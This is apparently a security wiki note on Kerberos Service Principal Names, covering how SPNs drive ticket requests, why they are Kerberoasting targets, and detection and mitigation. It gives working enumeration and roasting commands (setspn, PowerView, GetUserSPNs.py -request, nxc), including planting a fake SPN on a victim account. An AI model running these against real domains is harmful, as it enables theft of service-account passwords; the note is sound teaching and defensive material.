---
title: Service Principal Name (SPN)
type: concept
created: 2026-09-06
updated: 2026-09-06
tags: [kerberos, active-directory, spn, service, protocol]
---

# Service Principal Name (SPN)

A **Service Principal Name** is the Kerberos **service identifier** — the
name a client uses in a TGS-REQ to request a ticket for a *service* (not a
user). Format: `service/host[:port]`, e.g. `MSSQLSvc/sql01.corp.local:1433`,
`cifs/file01`, `HTTP/web01`. SPNs are stored on AD **computer objects**
(`servicePrincipalName`) and are the **target of [[kerberoasting]]** — the
single most important reason they matter to an attacker. See
[[kerberos-authentication]] for where SPNs sit in the AS/TGS flow.

## How SPNs work in the TGS stage

1. The client already has a **TGT** (from the AS-REQ/AS-REP, see
   [[kerberos-authentication]]).
2. To reach a service, it sends a **TGS-REQ** naming the service by its
   **SPN** (`service/host`).
3. The KDC finds the **account** that registered that SPN and issues a
   **TGS** encrypted with **that account's key** (the service account's NT
   hash or AES key — see [[kerberos-encryption-types]]).
4. The client presents the TGS to the service.

**Key point:** the TGS is encrypted with the **service account's** secret, so
whoever cracks the TGS recovers the **service account's password**. That's the
entire [[kerberoasting]] primitive — and it's why SPNs are high-value.

## Where SPNs live (the attack surface)

- **`servicePrincipalName` on computer objects** — the standard, visible SPNs
  (SQL, MSSQLSvc, HOST/, etc.). `Get-SPNs` / `GetUserSPNs.py` enumerate them.
- **`servicePrincipalName` on user objects** — **service accounts** (non-built-in
  accounts like `svc_sql`) that registered an SPN. *These* are the classic
  Kerberoast targets — a normal user object with an SPN is a TGS you can
  request and crack.
- **`msDS-AllowedToDelegateTo`** — constrained-delegation service names
  ([[kerberos-delegation-abuse]]).
- **GMSA / gMSA** — Group Managed Service Accounts auto-manage SPNs +
  rotating keys ([[gmsa]]) — a *mitigation* against Kerberoasting because the
  key rotates.

## Enumeration (the first step of Kerberoasting)

```powershell
setspn.exe -T corp.local -Q */*                 # native, no tooling: every SPN in the domain
Get-DomainUser -SPN | select samaccountname,serviceprincipalname   # PowerView: USER SPNs = the roast targets
Get-DomainComputer -SPN | select name,serviceprincipalname          # computer SPNs = service inventory
# Register a fake SPN on a user you can write, to force it roastable, then remove:
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # targeted roast -> [[targeted-roasting]]
Set-DomainObject -Identity victim -Clear serviceprincipalname             # revert
```
```bash
GetUserSPNs.py -dc-ip <dc> corp.local/user:pass                 # list SPN accounts
GetUserSPNs.py -dc-ip <dc> corp.local/user:pass -request        # ...and roast them all
GetUserSPNs.py -dc-ip <dc> corp.local/user:pass -request-user svc_sql   # roast just one (quieter)
nxc ldap <dc> -u user -p pass --kerberoasting out.txt           # nxc built-in
```
Every account in that output is a **Kerberoast target** — request its TGS and
crack it. See [[kerberoasting]] for the full request + crack flow, and
[[ldap]] for the raw `(servicePrincipalName=*)` filter.

## Why it matters to an attacker

- **[[kerberoasting]]** — request a TGS for any SPN-owning account and crack
  the service password (RC4 downgrade for speed — see
  [[kerberos-encryption-types]]).
- **Service identification** — SPNs tell you *what* runs on a host (SQL,
  IIS, MySQL) → what to attack next.
- **Constrained delegation** — `msDS-AllowedToDelegateTo` is an SPN list;
  abuse = impersonation ([[kerberos-delegation-abuse]]).
- **SPN registration abuse** — registering an SPN on your controlled account
  lets you be targeted for Kerberoast / delegation.

## Detection

- **4769 TGS-REQ bursts** for many different service SPNs from one client —
  Kerberoast enumeration (see [[kerberoasting]]).
- **4768/4769 RC4 (`0x17`) downgrade** — RC4 TGS requests are a Kerberoast
  tell.
- **SPN registration** — a new `servicePrincipalName` on a user object is
  unusual (Event 5136 on the account).

## Mitigations

- **GMsA** — auto-rotating service keys so a captured TGS is short-lived
  ([[gmsa]]).
- **Force AES** for service tickets (drop RC4) — slows cracking
  ([[kerberos-encryption-types]]).
- **Minimize SPN-owning service accounts** — use dedicated, low-priv service
  accounts; avoid domain-privileged accounts owning SPNs.
- **Alert on bulk 4769 TGS requests** and RC4 downgrades.

## Links

- [[kerberoasting]] — the primary SPN attack (TGS request + crack)
- [[kerberos-authentication]] — the TGS-REQ/TGS-REP stage SPNs drive
- [[kerberos-encryption-types]] — the RC4/AES the TGS is encrypted with
- [[kerberos-delegation-abuse]] — `msDS-AllowedToDelegateTo` SPN lists
- [[gmsa]] — the rotating-key SPN mitigation
- [[resource-based-constrained-delegation]] — the machine-side SPN/delegation abuse
- [[pass-the-hash-and-ticket]] — once the SPN's account is cracked, reuse it
- [[tgt-tgs]] — a TGS is a ticket *for* an SPN (and its key is the abuse surface)

## References

- [Microsoft: Service principal names](https://learn.microsoft.com/en-us/windows/security/kerberos/kerberos-service-principal-names)
- [ired.team: Kerberoasting](https://www.ired.team/active-directory-kerberos-abuse/kerberoasting)
- [kerberos-authentication (this wiki)](kerberos-authentication)
